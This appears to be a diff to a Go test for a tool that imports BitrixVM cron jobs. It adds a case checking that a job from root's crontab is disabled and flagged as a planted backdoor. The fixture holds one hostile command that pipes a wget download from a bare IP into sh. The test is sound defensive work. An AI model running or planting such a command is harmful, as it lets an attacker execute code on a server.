@@ -302,6 +302,13 @@ func TestForeignHelpers(t *testing.T) {
 			t.Errorf("suspiciousCron(%q) = %v", cmd, got)
 		}
 	}
+	// A planted job from BitrixVM's root crontab carries its origin first and
+	// still gets its note in the plan.
+	planted := f.cronJob(cronEntry{schedule: "*/10 * * * *", command: "cd /home/bitrix/www && wget -q -O- http://203.0.113.9/x | sh"})
+	planted.Comment = strings.TrimSuffix("from root's crontab; "+planted.Comment, "; ")
+	if notes := cronNotes([]*store.CronJob{planted}); planted.Enabled || len(notes) != 1 || !strings.Contains(notes[0], "looks like a planted backdoor") {
+		t.Errorf("planted job from root's crontab: %+v %q", planted, notes)
+	}
 	for in, want := range map[string]string{
 		"/usr/bin/php -f /x.php":            "php -f /x.php",
 		"cd /x && /usr/local/bin/php a.php": "cd /x && php a.php",
